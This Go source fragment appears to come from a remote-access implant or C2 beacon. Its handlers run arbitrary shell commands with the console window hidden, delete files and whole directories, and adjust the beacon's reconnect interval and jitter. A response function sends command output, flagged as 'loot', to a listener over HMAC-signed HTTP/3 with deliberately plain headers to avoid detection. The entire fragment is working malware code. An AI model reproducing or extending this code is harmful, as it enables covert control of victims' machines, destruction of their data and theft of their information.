func executeCmdDirect(command string) (string, error) {
	// Parse the command to extract arguments
	parts := strings.Fields(command)

	if len(parts) == 1 {
		// Just "cmd.exe" - start interactive shell
		cmd := exec.Command("cmd.exe")
		// Hide console window on Windows
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: 0x08000000, // CREATE_NO_WINDOW
		}
		output, err := cmd.CombinedOutput()
		if err != nil {
			return string(output), err
		}
		return string(output), nil
	}

	// cmd.exe with arguments
	args := parts[1:]
	cmd := exec.Command("cmd.exe", args...)
	// Hide console window on Windows
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}
	output, err := cmd.CombinedOutput()
	if err != nil {
		return string(output), err
	}

	return string(output), nil
}

// handleExec executes system commands
func handleExec(args []string) (string, error) {
	if len(args) == 0 {
		return "", fmt.Errorf("usage: exec <command>")
	}

	// Join all arguments into a single command string
	command := strings.Join(args, " ")

	// Execute the command using the system shell
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
		// Hide console window on Windows
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: 0x08000000, // CREATE_NO_WINDOW
		}
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return string(output), err
	}

	return string(output), nil
}

// handleReconnect changes the reconnection interval
func handleReconnect(args []string) (string, error) {
	if len(args) == 0 {
		return fmt.Sprintf("Current reconnect interval: %d seconds\nUsage: reconnect <seconds>", reconnectInterval), nil
	}

	// Parse the new interval
	newInterval, err := strconv.Atoi(args[0])
	if err != nil {
		return "", fmt.Errorf("invalid interval: %v (must be a number)", err)
	}

	if newInterval < 5 {
		return "", fmt.Errorf("interval too small: %d seconds (minimum: 5 seconds)", newInterval)
	}

	if newInterval > 3600 {
		return "", fmt.Errorf("interval too large: %d seconds (maximum: 3600 seconds)", newInterval)
	}

	// Update the global interval
	oldInterval := reconnectInterval
	reconnectInterval = newInterval

	return fmt.Sprintf("Reconnect interval changed from %d to %d seconds", oldInterval, newInterval), nil
}

// handleRm removes a file
func handleRm(args []string) (string, error) {
	if len(args) == 0 {
		return "", fmt.Errorf("usage: rm <filepath>")
	}

	filePath := args[0]

	// Get current working directory
	currentDir, err := os.Getwd()
	if err != nil {
		return "", fmt.Errorf("failed to get current directory: %v", err)
	}

	// Create absolute path
	var absPath string
	if filepath.IsAbs(filePath) {
		absPath = filePath
	} else {
		absPath = filepath.Join(currentDir, filePath)
	}

	// Check if path exists
	info, err := os.Stat(absPath)
	if err != nil {
		return "", fmt.Errorf("file not found: %v", err)
	}

	// Make sure it's not a directory
	if info.IsDir() {
		return "", fmt.Errorf("cannot remove directory with rm (use rmdir): %s", absPath)
	}

	// Remove the file
	if err := os.Remove(absPath); err != nil {
		return "", fmt.Errorf("failed to remove file: %v", err)
	}

	return fmt.Sprintf("Removed file: %s", absPath), nil
}

// handleRmdir removes a directory
func handleRmdir(args []string) (string, error) {
	if len(args) == 0 {
		return "", fmt.Errorf("usage: rmdir <dirpath>")
	}

	dirPath := args[0]

	// Get current working directory
	currentDir, err := os.Getwd()
	if err != nil {
		return "", fmt.Errorf("failed to get current directory: %v", err)
	}

	// Create absolute path
	var absPath string
	if filepath.IsAbs(dirPath) {
		absPath = dirPath
	} else {
		absPath = filepath.Join(currentDir, dirPath)
	}

	// Check if path exists
	info, err := os.Stat(absPath)
	if err != nil {
		return "", fmt.Errorf("directory not found: %v", err)
	}

	// Make sure it's a directory
	if !info.IsDir() {
		return "", fmt.Errorf("not a directory (use rm for files): %s", absPath)
	}

	// Remove the directory and all contents
	if err := os.RemoveAll(absPath); err != nil {
		return "", fmt.Errorf("failed to remove directory: %v", err)
	}

	return fmt.Sprintf("Removed directory: %s", absPath), nil
}

// handleJitter changes the jitter value for beacon intervals
func handleJitter(args []string) (string, error) {
	if len(args) == 0 {
		return fmt.Sprintf("Current jitter: +/- %d seconds\nUsage: jitter <seconds>", jitterSeconds), nil
	}

	// Parse the new jitter value
	newJitter, err := strconv.Atoi(args[0])
	if err != nil {
		return "", fmt.Errorf("invalid jitter: %v (must be a number)", err)
	}

	if newJitter < 0 {
		return "", fmt.Errorf("jitter cannot be negative: %d seconds", newJitter)
	}

	if newJitter > 300 {
		return "", fmt.Errorf("jitter too large: %d seconds (maximum: 300 seconds)", newJitter)
	}

	// Update the global jitter
	oldJitter := jitterSeconds
	jitterSeconds = newJitter

	return fmt.Sprintf("Jitter changed from +/- %d to +/- %d seconds", oldJitter, newJitter), nil
}

func sendCommandResponse(commandID int, output, status string) error {
	response := CommandResponse{
		CommandID: commandID,
		Output:    output,
		Status:    status,
	}

	jsonData, err := json.Marshal(response)
	if err != nil {
		return err
	}

	// HMAC goes in body, not headers
	body := string(jsonData)
	timestamp, signature := signRequest("POST", listenerEndpoint, body)

	// Wrap the data with HMAC fields (using json.RawMessage to preserve exact bytes)
	wrapper := map[string]interface{}{
		"data":      json.RawMessage(jsonData),
		"timestamp": timestamp,
		"signature": signature,
	}

	// Marshal the wrapper
	finalData, err := json.Marshal(wrapper)
	if err != nil {
		return err
	}

	// Create QUIC request with NO custom headers - just plain JSON!
	headers := map[string]string{
		"Content-Type": "application/json",
	}

	// Check if this is a file response (contains "got" and LOOT_ENTRIES)
	if strings.Contains(output, "got") && strings.Contains(output, "LOOT_ENTRIES:") {
		headers["type"] = "loot"
	}

	// Check if this response contains loot entries (from ls command)
	if strings.Contains(output, "LOOT_ENTRIES:") {
		headers["type"] = "loot"
	}

	respData, err := sendHTTP3Request(listenerEndpoint, finalData, headers)
	if err != nil {
		return err
	}

	// Parse response
	var cmdResponse map[string]interface{}
	if err := json.Unmarshal(respData, &cmdResponse); err != nil {
		return fmt.Errorf("invalid response format: %v", err)
	}

	statusCode, ok := cmdResponse["status"].(float64)
	if !ok || statusCode != 200 {
		body, _ := json.Marshal(cmdResponse)
		return fmt.Errorf("command response failed: status %v, body: %s", statusCode, string(body))
	}

	return nil
}
